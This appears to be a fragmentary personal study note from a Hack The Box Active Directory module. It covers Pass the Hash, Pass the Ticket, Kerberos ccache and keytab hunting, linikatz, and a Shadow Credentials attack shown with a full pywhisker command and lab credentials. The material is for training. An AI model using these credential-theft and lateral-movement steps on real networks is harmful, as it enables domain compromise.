...
![Pasted image 20251028133137](../../attchments/Pasted%20image%2020251028133137.png)
...
![Pasted image 20251028180718](../../attchments/Pasted%20image%2020251028180718.png)
`Task manager method`
...
![Pasted image 20251028204036](../../attchments/Pasted%20image%2020251028204036.png)
...
A [Pass the Hash (PtH|[PtH)](PtH)]]) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password
...
Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT|[PtT) attack](PtT) attack]]%20attack). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash
...
Another everyday use of Kerberos in Linux is with [](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro) files. A `keytab` is a file containing pairs of Kerberos principals and encrypted keys
...
#### Hunting for ccache file

```shell-session
ls -la /tmp
```
`Looking in /tmp for ccache files`

```shell-session
id julio@inlanefreight.htb
```
`THis will the groups info for an user intresting groups(domain users)`
...
```
`Executing ls command as julio user`

```shell-session
AntivenomisCrazy@htb[/htb]$ cat /etc/hosts
...
```shell-session
AntivenomisCrazy@htb[/htb]$ cat /etc/proxychains.conf
...
```
`RDP to the target and run the chisel clint to connect at 8080`
...
```
`While installing this give domain and KDC`

```shell-session
AntivenomisCrazy@htb[/htb]$ cat /etc/krb5.conf
...
...SNIP...
```
`IF krb5-user is alredy installed then change the config file fron here`
...
```
`We can convert an ccache file to kirbi file`
...
/opt/linikatz.sh
```
`Works like mimmikatz but for linux`
...
```
`To Get the TGT as /tmp/dc.ccache file`


### Shadow Credentials (msDS-KeyCredentialLink)

the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT 

In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute,

![](../../attchments/Pasted%20image%2020251121140000.png)

```shell-session
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```
`THis will give you eFUVVTPf.pfx file and it's password then you can use that to get the TGT`
...
```
`gettgtpkinit.py to get the TGT(ccache file) using the pfx file and it's password`
